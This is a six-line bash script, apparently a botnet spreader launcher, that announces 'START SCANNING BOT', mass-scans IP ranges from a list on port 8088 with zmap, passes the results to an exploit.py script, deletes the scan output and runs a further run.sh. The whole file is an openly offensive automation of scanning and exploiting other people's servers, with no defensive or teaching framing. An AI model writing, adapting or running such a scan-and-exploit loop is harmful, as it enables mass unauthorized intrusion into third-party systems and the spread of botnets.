#!/bin/bash
echo -e "\e[1;32mSTART SCANNING BOT"
zmap -p8088 -wama.lst -o out.txt
python exploit.py out.txt
rm -rf out.txt
sh run.sh